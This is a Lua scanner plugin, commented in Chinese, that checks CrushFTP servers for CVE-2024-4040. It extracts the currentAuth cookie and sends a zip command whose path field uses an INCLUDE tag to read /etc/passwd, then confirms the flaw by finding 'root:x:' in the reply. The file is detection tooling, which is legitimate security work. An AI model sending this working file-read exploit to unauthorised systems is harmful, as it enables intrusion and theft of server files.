description = [[
CrushFTP VFS - Sandbox Escape LFR (CVE-2024-4040)
]]

function check_CVE_2024_4040(target)
    print("[CrushFTP] Starting CVE-2024-4040 check for", target)
    
    -- 第一步：获取初始页面和 currentAuth
    local init_headers = {
        ["User-Agent"] = "Mozilla/5.0 (ZZ; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0"
    }
    
    print("[CrushFTP] Getting initial page")
    local init_resp = http.get(target .. "/WebInterface/", {
        headers = init_headers,
        timeout = 10
    })
    
    if not init_resp or not init_resp.headers then
        print("[CrushFTP] Failed to get initial page")
        return nil
    end
    
    -- 从响应头中提取 currentAuth
    local auth = nil
    for name, value in pairs(init_resp.headers) do
        if string.lower(name) == "set-cookie" then
            local auth_match = string.match(value, "currentAuth=([0-9a-zA-Z]+)")
            if auth_match then
                auth = auth_match
                break
            end
        end
    end
    
    if not auth then
        print("[CrushFTP] Failed to extract currentAuth")
        return nil
    end
    
    print("[CrushFTP] Found currentAuth:", auth)
    
    -- 第二步：发送漏洞利用请求
    local exploit_headers = {
        ["User-Agent"] = init_headers["User-Agent"],
        ["Host"] = target:match("https?://([^:/]+)"),
        ["Content-Type"] = "application/x-www-form-urlencoded",
        ["Content-Length"] = "0"
    }
    
    local exploit_url = target .. "/WebInterface/function/?command=zip&c2f=" .. auth .. "&path=<INCLUDE>/etc/passwd</INCLUDE>&names=/bbb"
    
    print("[CrushFTP] Sending exploit request to:", exploit_url)
    
    local resp = http.post(exploit_url, {
        headers = exploit_headers,
        timeout = 10,
        allow_redirects = false
    })
    
    if not resp then
        print("[CrushFTP] No response received")
        return nil
    end
    
    print("[CrushFTP] Response status:", resp.status)
    
    -- 检查响应
    if resp.status == 200 and resp.body then
        -- 检查响应头中的 Content-Type
        local is_xml = false
        for name, value in pairs(resp.headers or {}) do
            if string.lower(name) == "content-type" and string.match(value:lower(), "text/xml") then
                is_xml = true
                break
            end
        end
        
        -- 检查是否包含 root:x: 并且是 XML 响应
        if string.match(resp.body, "root:x:") and is_xml then
            print("[CrushFTP] Vulnerability CVE-2024-4040 confirmed!")
            return {
                CVEID = "CVE-2024-4040",
                Severity = "critical",
                Type = "lfi"
            }
        end
    end
    
    print("[CrushFTP] Target appears to be not vulnerable")
    return nil
end

function Analyze(info)
    if not info or not info.IP or not info.Port then
        print("[CrushFTP] Invalid ServiceInfo: missing IP or Port")
        return info
    end

    print("[CrushFTP] Starting analysis for", info.IP..":", info.Port)
    
    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    if info.Port == 443 then
        target = string.format("https://%s:%d", info.IP, info.Port)
    end
    print("[CrushFTP] Target URL:", target)
    
    -- 检查漏洞
    local vulns = {}
    local result = check_CVE_2024_4040(target)
    if result then
        table.insert(vulns, result)
        print("[CrushFTP] Added vulnerability:", result.CVEID)
    end
    
    -- 更新结果
    if #vulns > 0 then
        info.Vulnerabilities = vulns
        print("[CrushFTP] Total vulnerabilities found:", #vulns)
    else
        print("[CrushFTP] No vulnerabilities found")
    end

    return info
end

 


